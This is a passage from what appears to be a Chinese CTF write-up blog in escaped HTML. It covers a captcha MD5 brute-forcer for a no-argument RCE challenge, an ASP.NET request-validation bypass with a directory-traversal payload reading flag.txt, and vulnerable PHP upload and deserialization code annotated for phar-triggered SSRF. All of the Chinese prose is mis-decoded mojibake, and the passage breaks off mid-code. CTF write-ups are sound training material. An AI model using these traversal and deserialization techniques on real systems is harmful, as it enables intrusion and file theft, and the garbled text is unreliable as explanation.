flag[int(tmp[2:])] = tmp[1:2]
flag[int(tmp[2:]) - 1] = tmp[0:1]
for i in flag:
print(i, end='')
print()
except:
pass
&lt;/code>&lt;/pre>&lt;p>flag{3e6d8ee7-40f1-40a1-b496-93c40f43c8b8}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp4-Rceme
&lt;/h4>
&lt;/summary>
&lt;p>ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„é¡µé¢ï¼Œéœ€è¦éªŒè¯ç ï¼Œä¸è¿‡è¿™ä¸ªéªŒè¯ç æ˜¯å¸¸è§è€ƒç‚¹äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">hashlib&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">md5_val&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">999999&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">100000000&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">md5_value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">hashlib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">hexdigest&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">md5_value&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#111">md5_val&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;6e3f2&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å‘½ä»¤æ‰§è¡Œçš„éƒ¨åˆ†ï¼Œç›´æŽ¥çœ‹å‡ºé¢˜äººçš„wpå§ï¼Œç”¨çš„æ˜¯&lt;code>[~(å¼‚æˆ–)][!%FF]&lt;/code>çš„å½¢å¼ç»„æˆå­—ç¬¦ä¸²,ç„¶åŽæ— å‚æ•°RCE&lt;/p>
&lt;p>è¿™éƒ¨åˆ†ç”¨çš„æ˜¯å¼‚æˆ–æž„é€ çš„æ–¹å¼ï¼Œemmmï¼Œä¸Šå‘¨è¯´è¦æ€»ç»“çš„ï¼Œä½†æ˜¯æ²¡æ€»ç»“ï¼ˆæˆ‘çš„ï¼Œè¿™å‘¨ä¸€å®šçœ‹&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&amp;amp;mid=2247485218&amp;amp;idx=1&amp;amp;sn=e910ddbd965ecb069b4da3d06443f337&amp;amp;chksm=e92292a1de551bb7c48bcca06053faed2a212642ee6a2f7767f671cc553f6a2d435f99fbfae6&amp;amp;mpshare=1&amp;amp;scene=23&amp;amp;srcid=1202ez9PcajE5NTRrZG6OF9G&amp;amp;sharer_sharetime=1606872114678&amp;amp;sharer_shareid=8752e0fdce9cf3d7a08d6c6826060293#rd">å®˜æ–¹wp&lt;/a> | &lt;a href="https://blog.codesec.work/d6b7888bcefc/">wp1&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[Windows][HITCON 2019]Buggy_Net
&lt;/h4>
&lt;/summary>
&lt;p>/Default.txtç»™å‡ºäº†æºç ï¼Œæ˜¯å°‘è§çš„win+asp.net&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-asp" data-lang="asp">bool isBad = false;
try {
if ( Request.Form[&amp;quot;filename&amp;quot;] != null ) { // filenameå‚æ•°éžç©º
isBad = Request.Form[&amp;quot;filename&amp;quot;].Contains(&amp;quot;..&amp;quot;) == true; // å¦‚æžœfilenameä¸­å«æœ‰`..`ä¸ºtrue
}
} catch (Exception ex) {
}
try {
if (!isBad) { // isBadä¸ºfalse
Response.Write(System.IO.File.ReadAllText(@&amp;quot;C:\inetpub\wwwroot\&amp;quot; + Request.Form[&amp;quot;filename&amp;quot;])); // è¯»å‡ºfilenameæŒ‡å®šçš„æ–‡ä»¶
}
} catch (Exception ex) {
}
&lt;/code>&lt;/pre>&lt;p>ä½†æ˜¯å½“å‰ç›®å½•åœ¨&lt;code>C:\inetpub\wwwroot\&lt;/code>ï¼Œéœ€è¦&lt;code>..\&lt;/code>è¿›è¡Œç›®å½•ç©¿è¶Šï¼›è¿™é‡Œçš„åˆ©ç”¨æ–¹å¼å‚è€ƒ-&amp;gt;&lt;a href="https://www.slideshare.net/SoroushDalili/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour">WAF Bypass Techniques - Using HTTP Standard and Web Serversâ€™ Behaviour&lt;/a> | &lt;a href="https://ctftime.org/writeup/16802">wp&lt;/a>ï¼Œè¿™é‡Œè½¬è¿°ä¸€ä¸‹&lt;/p>
&lt;p>å¯¹äºŽPOSTè¯·æ±‚ï¼Œä¼šå­˜åœ¨request validationæ¥æ£€æµ‹formè¡¨å•ä¸­å«æœ‰ä¸€äº›å±é™©å†…å®¹ï¼ˆæ¯”å¦‚&lt;code>&amp;lt;x&lt;/code>ï¼‰ï¼Œå¤„ç†çš„æ–¹å¼æ˜¯ä¸­æ­¢æ•´ä¸ªappï¼›ç„¶è€Œå¯¹äºŽç›¸åŒçš„å†…å®¹ï¼Œåœ¨query-string fieldsä¸­ä¼šé€šè¿‡åˆå§‹çš„request validationï¼Œå¹¶ä¸”ä»…ä»…åœ¨é¦–æ¬¡çš„&lt;code>Request.QueryString[...]&lt;/code>æŠ›å‡ºå¼‚å¸¸&lt;/p>
&lt;p>å¯¹äºŽGETçš„query-string filedsä¹Ÿå­˜åœ¨request validationï¼Œä½†æ˜¯å¦‚æžœåŠ ä¸€ä¸ªformè¡¨å•ï¼Œå°±ä¼šäº§ç”Ÿå’Œä¸Šè¿°åŽåŠéƒ¨åˆ†ä¸€æ ·çš„æ•ˆæžœ&lt;/p>
&lt;p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥æäº¤ä¸€ä¸ªGETè¯·æ±‚ï¼ˆä¸å¸¦æœ‰getæŸ¥è¯¢å‚æ•°ï¼‰ï¼Œä½†æ˜¯ä¾ç„¶å«æœ‰bodyéƒ¨åˆ† å¹¶ä¸”æŠŠ&lt;code>&amp;lt;x&lt;/code>åŠ åˆ°bodyä¸­ï¼Œå°±ä¼šä½¿ç¬¬ä¸€æ¬¡çš„åˆ¤æ–­ä¸­è¿›å…¥å¼‚å¸¸éƒ¨åˆ†-&amp;gt;passï¼Œä¸ä¿®æ”¹&lt;code>isBad&lt;/code>çš„boolå€¼ï¼Œè¿›å…¥ç¬¬äºŒæ¬¡åˆ¤æ–­åŽç›´æŽ¥æ‹¼æŽ¥filenameï¼Œè¯»å‡ºflagï¼›payload&lt;/p>
&lt;pre tabindex="0">&lt;code>GET /
POST: filename=../../../flag.txt&amp;amp;amiz=&amp;lt;x
&lt;/code>&lt;/pre>&lt;p>å‚è€ƒï¼š&lt;a href="https://www.slideshare.net/SoroushDalili/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour">WAF Bypass Techniques - Using HTTP Standard and Web Serversâ€™ Behaviour&lt;/a> | &lt;a href="https://ctftime.org/writeup/16802">wp&lt;/a>&lt;/p>
&lt;p>flag{e2c62455-e081-4782-8320-7c76ef570244}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
*[NCTF2019]phar matches everything
&lt;/h4>
&lt;/summary>
&lt;p>ç»™å‡ºäº†æºç ï¼Œç›´æŽ¥github.devçœ‹äº† &lt;a href="https://github.dev/swfangzhang/My-2019NCTF/tree/master/phar%20matches%20everything">è¿™é‡Œæ˜¯url&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119005449330.png" alt="image-20220119005449330">&lt;/p>
&lt;p>ä¸¤ä¸ªæ–‡ä»¶å¤¹åˆ†åˆ«æ˜¯ä¸¤ä¸ªdockerï¼ˆç”¨dockerfileç¼–æŽ’åˆ°ä¸€èµ·äº† ipä¸åŒï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119005701913.png" alt="image-20220119005701913">&lt;/p>
&lt;p>osrcçš„æœ‰80ç«¯å£æš´éœ²åœ¨å¤–é¢ï¼Œç»“åˆé¡µé¢çš„äº¤äº’å…ˆçœ‹osrcä¸­çš„catchmine.phpå’Œupload.php&lt;/p>
&lt;p>upload.phpï¼Œå¯ä»¥ä¸Šä¼ æ–‡ä»¶&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$target_dir&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;uploads/&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$uploadOk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$imageFileType&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;fileToUpload&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#75af00">strrpos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;fileToUpload&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;fileToUpload&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#111">]));&lt;/span>
&lt;span style="color:#111">$file_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;span style="color:#111">$file_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$file_name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$imageFileType&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$target_file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$target_dir&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$file_name&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">getimagesize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;fileToUpload&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;tmp_name&amp;#34;&lt;/span>&lt;span style="color:#111">]);&lt;/span> &lt;span style="color:#75715e">// getimagesizeæ£€æµ‹æ–‡ä»¶ç±»åž‹ å¯è§¦å‘ååºåˆ—åŒ–
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$check&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;File is an image - &amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$check&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;mime&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$uploadOk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;File is not an image.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$uploadOk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_exists&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$target_file&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// æ£€æµ‹åŒå å½“ç„¶å› ä¸ºmd5çš„åŽŸå› ä¹Ÿä¸å¤ªèƒ½åŒå
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Sorry, file already exists.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$uploadOk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;fileToUpload&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;size&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">500000&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// é™åˆ¶å¤§å°
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Sorry, your file is too large.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$uploadOk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$imageFileType&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#34;jpg&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">$imageFileType&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#34;png&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">$imageFileType&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#34;gif&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">$imageFileType&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#34;jpeg&amp;#34;&lt;/span> &lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// åŽç¼€ç™½åå•
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Sorry, only jpg,png,gif,jpeg are allowed.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$uploadOk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$uploadOk&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Sorry, your file was not uploaded.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">move_uploaded_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;fileToUpload&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;tmp_name&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">$target_file&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;The file &lt;/span>&lt;span style="color:#d88200">$file_name&lt;/span>&lt;span style="color:#d88200"> has been uploaded to ./uploads/&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// å›žæ˜¾æ–‡ä»¶è·¯å¾„
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Sorry, there was an error uploading your file.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>catchmine.phpæœ‰ä¸ªååºåˆ—åŒ–ç‚¹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Easytest&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$test&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// $test = &amp;#39;1&amp;#39; æ³¨æ„ååºåˆ—åŒ–äº§ç”Ÿä¸å¯è§å­—ç¬¦ æ”¹æˆpublic
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">funny_get&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">curl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">){&lt;/span> &lt;span style="color:#75715e">// å®žçŽ°curlæ“ä½œ
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$ch&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">CURLOPT_URL&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this_is_a_easy_test&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;careful&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span> &lt;span style="color:#75715e">// ååºåˆ—åŒ–å…¥å£ Easytestå®žä¾‹
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this_is_a_easy_test&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">funny_get&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">curl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// å¯ä»¥è®¿é—®å†…ç½‘ è¿›è¡Œssrf
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">getimagesize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span> &lt;span style="color:#75715e">// getimagesizeæ£€æµ‹æ–‡ä»¶ç±»åž‹ å¯è§¦å‘ååºåˆ—åŒ–
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$check&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;File is an image - &amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$check&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;mime&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;File is not an image.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
